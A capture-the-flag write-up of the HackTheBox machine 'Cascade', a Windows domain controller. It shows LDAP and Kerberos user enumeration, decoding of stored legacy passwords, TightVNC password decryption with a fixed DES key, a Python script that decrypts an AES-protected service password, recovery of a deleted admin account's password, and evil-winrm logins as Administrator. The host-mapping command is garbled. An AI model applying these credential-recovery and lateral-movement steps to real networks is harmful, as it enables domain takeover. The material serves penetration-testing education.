---
title: Cascade - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250829
tags:
  - walkthrough
  - active
  - directory
  - windows
  - medium
---
# Cascade - A HackTheBox machine

## Description

![](img/Cascade.png)

Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user `r.thompson`, which gives access to a `TightVNC` registry backup. The backup is decrypted to gain the password for `s.smith`. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.

## user.txt

Enumerate the target:

```bash
sudo nmap -sC -sV $ip -Pn --top-ports 10000
```

Output:

```
Host is up (0.037s latency).
Not shown: 8353 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 19:01:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -7m01s
| smb2-time: 
|   date: 2025-01-13T19:02:22
|_  start_date: 2025-01-13T18:56:18

```

Add host mapping (inferred for later commands):

```bash
echo "10.129.233.197  CASC-DC1.cascade.local CASC-DC1 cascade.local
" > sudo tee -a /&etc/hosts
```

Ensure time is in sync (Kerberos is picky): Keep skew < 5 minutes.

```bash
sudo ntpdate -s $ip 
```

Prepare a mnimal krb5.conf (optional if using -dc-ip):

```
[libdefaults]
  default_realm = CASCADE.LOCAL
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  CASCADE.LOCAL = {
    kdc = cascade.local
    admin_server = cascade.local
  }

[domain_realm]
  .cascade.local = CASCADE.LOCAL
  cascade.local = CASCADE.LOCAL

```

No credentials are provided. However, LDAP anonymous binds are enabled. 

**Different techniques for user enumeration.**

With crackmapexec:

```bash
crackmapexec smb $ip --users
```

Results:

```
SMB         10.129.67.96    445    CASC-DC1         [+] Enumerated domain user(s)
SMB         10.129.67.96    445    CASC-DC1         cascade.local\CascGuest                      Built-in account for guest access to the computer/domain
SMB         10.129.67.96    445    CASC-DC1         cascade.local\arksvc                         
SMB         10.129.67.96    445    CASC-DC1         cascade.local\s.smith                        
SMB         10.129.67.96    445    CASC-DC1         cascade.local\r.thompson                     
SMB         10.129.67.96    445    CASC-DC1         cascade.local\util                           
SMB         10.129.67.96    445    CASC-DC1         cascade.local\j.wakefield                    
SMB         10.129.67.96    445    CASC-DC1         cascade.local\s.hickson                      
SMB         10.129.67.96    445    CASC-DC1         cascade.local\j.goodhand                     
SMB         10.129.67.96    445    CASC-DC1         cascade.local\a.turnbull                     
SMB         10.129.67.96    445    CASC-DC1         cascade.local\e.crowe                        
SMB         10.129.67.96    445    CASC-DC1         cascade.local\b.hanson                       
SMB         10.129.67.96    445    CASC-DC1         cascade.local\d.burman                       
SMB         10.129.67.96    445    CASC-DC1         cascade.local\BackupSvc                      
SMB         10.129.67.96    445    CASC-DC1         cascade.local\j.allen                        
SMB         10.129.67.96    445    CASC-DC1         cascade.local\i.croft  
```

Refining valid users with kerbrute_linux_amd64:

```bash
~/tools/kerbrute/dist/kerbrute_linux_amd64 userenum -d cascade.local --dc $ip ~/Projects/MACHINES/cascade.local/users.txt 

```

Output:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/02/25 - Ronnie Flathers @ropnop

2025/09/02 21:15:34 >  Using KDC(s):
2025/09/02 21:15:34 >  	10.129.233.197:88

2025/09/02 21:15:39 >  [+] VALID USERNAME:	 s.smith@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 arksvc@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 s.hickson@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 BackupSvc@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 j.allen@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 d.burman@cascade.local
2025/09/02 21:15:39 >  [+] VALID USERNAME:	 util@cascade.local
2025/09/02 21:15:45 >  Done! Tested 11 usernames (7 valid) in 10.192 seconds

```

Valid users are saved to file usersfiltered.txt.

**Enumerating with ldapsearch:**

```
ldapsearch -x -H ldap://$ip -b "DC=CASCADE,DC=LOCAL" "(objectClass=user)"   
```

Output is extensive. The following snippet contains the parameter cascadeLegacyPwd:

```
# Ryan Thompson, Users, UK, cascade.local 
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local 
objectClass: top 
objectClass: person 
objectClass: organizationalPerson 
objectClass: user 
cn: Ryan Thompson 
sn: Thompson 
givenName: Ryan 
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local 
instanceType: 4 
whenCreated: 20200109193126.0Z 
whenChanged: 20200323112031.0Z 
displayName: Ryan Thompson 
uSNCreated: 24610 
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 
name: Ryan Thompson 
objectGUID:: LfpD6qngUkupEy9bFXBBjA== 
userAccountControl: 66048 
badPwdCount: 0 
codePage: 0 
countryCode: 0 
badPasswordTime: 132247339091081169 
lastLogoff: 0 
lastLogon: 132247339125713230 
pwdLastSet: 132230718862636251 
primaryGroupID: 513 
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== 
accountExpires: 9223372036854775807 
logonCount: 2 
sAMAccountName: r.thompson sAMAccountType: 805306368 
userPrincipalName: r.thompson@cascade.local 
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z 
dSCorePropagationData: 20200119174753.0Z 
dSCorePropagationData: 20200119174719.0Z 
dSCorePropagationData: 20200119174508.0Z 
dSCorePropagationData: 16010101000000.0Z 
lastLogonTimestamp: 132294360317419816 
msDS-SupportedEncryptionTypes: 0 
cascadeLegacyPwd: clk0bjVldmE=

```

The value for cascadeLegacyPwd parameter is base64 encoded:

```
echo "clk0bjVldmE=" | base64 -d
```

Results: rY4n5eva

Checking out credentials:

```bash
crackmapexec smb $ip -u users.txt  -p rY4n5eva 
```

A match for r.thompson is obtained. Enumerate smb shares:

```bash
crackmapexec smb $ip -u r.thompson -p rY4n5eva --shares
```

Output:

```
SMB         10.129.233.197  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.233.197  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.233.197  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.233.197  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.233.197  445    CASC-DC1         -----           -----------     ------
SMB         10.129.233.197  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.233.197  445    CASC-DC1         Audit$                          
SMB         10.129.233.197  445    CASC-DC1         C$                              Default share
SMB         10.129.233.197  445    CASC-DC1         Data            READ            
SMB         10.129.233.197  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.233.197  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.233.197  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.233.197  445    CASC-DC1         SYSVOL          READ            Logon server share 

```

Create a TGT ticket for r.thompson user:

```bash
getTGT.py cascade.local/'r.thompson':'rY4n5eva'

export KRB5CCNAME=$(pwd)/r.thompson.ccache
```

Run bloodhound:

```bash
bloodhound-python -u r.thompson -p rY4n5eva -k -ns $ip -c All -d cascade.local --zip
```

Access the smb shares and download interesting files:

```bash
smbclient.py CASC-DC1.cascade.local  -k 

shares
use Data
ls
cd IT
ls
cd  "Email Archives"
ls
get Meeting_Notes_June_2018.html 

└─$ cat Meeting_Notes_June_2018.html 

<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>


```

```bash
smbclient.py CASC-DC1.cascade.local  -k 

shares
use Data
ls
cd IT
ls



└─$ cat ArkAdRecycleBin.log 
1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0	
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0

```

```bash
smbclient.py CASC-DC1.cascade.local  -k 

shares
use Data
ls
cd Temp
ls
s.smith
ls
get VNC Install.reg 


└─$ cat VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Key field: `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.  Use the following snippet code to  decrypt it:

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

Output: sT333ve2

Check access:

```bash
crackmapexec winrm $ip -u s.smith -p 'sT333ve2' 
```

From previous bloodhound analysis, it's noticed that user s.smith belongs to the `REMOTE MANAGEMENT USERS` group. Create a TGT ticket for user s.smith:

```bash
getTGT.py cascade.local/'s.smith':'sT333ve2'

export KRB5CCNAME=$(pwd)/s.smith.ccache
```

Access the machine with Evil-Winrm:

```bash
evil-winrm -i CASC-DC1.CASCADE.LOCAL -k s.smith.ccache -r CASCADE.LOCAL
```

Print the flag:

```powershell
type c:\Users\s.smith\Desktop\user.txt
```


## root.txt


Create a TGT: 

```bash
getTGT.py cascade.local/'s.smith':'sT333ve2'

export KRB5CCNAME=$(pwd)/s.smith.ccache
```

Run bloodhound:

```
bloodhound-python -u s.smith -p sT333ve2 -k -ns $ip -c All -d cascade.local --zip
```

Access the smb shares

```bash
crackmapexec smb $ip -u s.smith -p sT333ve2 --shares
```

Note that the user has access to the Audit$ share. Access and examine the share:

```bash
smbclient.py CASC-DC1.cascade.local  -k 

shares
use Audit$

```

Download all files related to the SQLite and use sqlite3 to dump the contents from the attacker machine:

```bash
└─$ sqlite3 Audit.db


SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> .schema DeletedUserAudit
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Username"	TEXT,
	"Name"	TEXT,
	"DistinguishedName"	TEXT
);
sqlite> .schema Ldap
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
sqlite> Select * FROM Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> 

```

Note: `1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local`. 


Open with dnspy CascAudit.exe and... see the following key:

![[htb-cascade_01.png]]

and the Initiator Vector 1tdyjCbY1Ix49842.

For decrypting `BQO5l5Kj9MdErXx6Q6AGOw==`, the C# file CascCrypto.dll contains the following encryption and decryption functions:

```C#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace CascCrypto
{
	// Token: 0x02000007 RID: 7
	public class Crypto
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002290 File Offset: 0x00000690
		public static string EncryptString(string Plaintext, string Key)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
			Aes aes = Aes.Create();
			aes.BlockSize = 128;
			aes.KeySize = 128;
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
			aes.Key = Encoding.UTF8.GetBytes(Key);
			aes.Mode = CipherMode.CBC;
			string result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes, 0, bytes.Length);
					cryptoStream.FlushFinalBlock();
				}
				result = Convert.ToBase64String(memoryStream.ToArray());
			}
			return result;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760
		public static string DecryptString(string EncryptedString, string Key)
		{
			byte[] array = Convert.FromBase64String(EncryptedString);
			Aes aes = Aes.Create();
			aes.KeySize = 128;
			aes.BlockSize = 128;
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
			aes.Mode = CipherMode.CBC;
			aes.Key = Encoding.UTF8.GetBytes(Key);
			string @string;
			using (MemoryStream memoryStream = new MemoryStream(array))
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
				{
					byte[] array2 = new byte[checked(array.Length - 1 + 1)];
					cryptoStream.Read(array2, 0, array2.Length);
					@string = Encoding.UTF8.GetString(array2);
				}
			}
			return @string;
		}

		// Token: 0x04000006 RID: 6
		public const string DefaultIV = "1tdyjCbY1Ix49842";

		// Token: 0x04000007 RID: 7
		public const int Keysize = 128;
	}
}
```

Write the following python script for decrypting:

```python
from Crypto.Cipher import AES
import base64

# Known values
key = b"c4scadek3y654321"  # 16-byte key
iv = b"1tdyjCbY1Ix49842"  # 16-byte IV
ciphertext_b64 = "BQO5l5Kj9MdErXx6Q6AGOw=="

# Decode Base64
ciphertext = base64.b64decode(ciphertext_b64)

# Create AES cipher in CBC mode
cipher = AES.new(key, AES.MODE_CBC, iv)

# Decrypt and remove PKCS7 padding
plaintext_padded = cipher.decrypt(ciphertext)
pad_len = plaintext_padded[-1]
plaintext = plaintext_padded[:-pad_len].decode("utf-8")

print(plaintext)
```

Run the script decrypting.py:

```bash
python decrypting.py
```

Output:

```
w3lc0meFr31nd
```

Therefore, the tester now has access to user `ArkSvc:w3lc0meFr31nd`.

Create a TGT ticket for user ArkSvc:

```bash
getTGT.py cascade.local/'ArkSvc':'w3lc0meFr31nd'

export KRB5CCNAME=$(pwd)/ArkSvc.ccache
```

Run bloodhound:

```
bloodhound-python -u ArkSvc -p w3lc0meFr31nd -k -ns $ip -c All -d cascade.local --zip
```

Note that the user ArkSvc belongs to the   `AD RECYCLE BIN` group.

Access via Evil-Winrm:

```
evil-winrm -i CASC-DC1.CASCADE.LOCAL -k ArkSvc.ccache -r CASCADE.LOCAL
```

Confirm that the user belong to the `AD RECYCLE BIN` group:

```powershell
whoami /groups
```

List deleted object in the Recycled bin:

``` powershell
Get-ADObject -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" -IncludeDeletedObjects -Filter *
```

Output:

```
Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=cascade,DC=local
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681

Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

```

The tester will examine further the TempAdmin user object:

```
Import-Module ActiveDirectory -Force


ActiveDirectory\Get-ADObject -IncludeDeletedObjects -LDAPFilter "(&(isDeleted=TRUE)(name=TempAdmin*))" -Properties *

```

Output:

```
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM


```

Note the `cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz`


```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
```

Output: baCT3r1aN00dles

The tester knows from the document `Meeting_Notes_June_2018.html` that:


```
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
```

Therefore, `Administrator:baCT3r1aN00dles`. Connect with evil-winrm:

```bash
evil-winrm -i 10.129.203.133 -u Administrator -p baCT3r1aN00dles     
```

Print the flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```
